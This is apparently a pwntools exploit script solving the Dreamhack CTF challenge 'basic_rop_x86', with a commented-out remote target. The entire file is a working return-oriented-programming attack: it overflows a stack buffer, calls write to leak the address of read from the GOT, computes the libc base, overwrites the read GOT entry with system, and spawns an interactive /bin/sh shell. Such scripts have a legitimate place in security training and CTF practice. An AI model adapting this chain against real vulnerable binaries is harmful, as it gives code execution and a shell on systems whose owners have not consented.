
from pwn import *
context.log_level = 'debug'
#p = remote("host3.dreamhack.games", "13936")
p = process('./basic_rop_x86')
#libc = ELF("./libc.so.6")
libc = ELF('/lib/i386-linux-gnu/libc.so.6') # 'ldd basic_rop_x86' 로 확인
e = ELF("./basic_rop_x86")

pop_pop_pop_ret = 0x8048689
pop_pop_ret = 0x804868a

pop_ret = pop_pop_ret + 1
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

#write_plt
payload = b"A" * 0x48
payload += p32(write_plt)
payload += p32(pop_pop_pop_ret)
payload += p32(0x0000001)
payload += p32(read_got)
payload += p32(0x0000004)

#read_plt
payload += p32(read_plt)
payload += p32(pop_pop_pop_ret)
payload += p32(0x0000000)
payload += p32(read_got)
payload += p32(0x000000c)

#read_plt
payload += p32(read_plt)
payload += p32(0xdeadbeef)
payload += p32(read_got+4)

p.send(payload)
result = p.recvuntil('A'*0x40)
result = p.recvn(4)
print("result", hex(u32(result)))
libc = u32(result) - read_offset
system = libc + system_offset
print("libc", hex(libc))
print("system", hex(system))

p.send(p32(system)+b"/bin/sh\x00")
p.interactive()
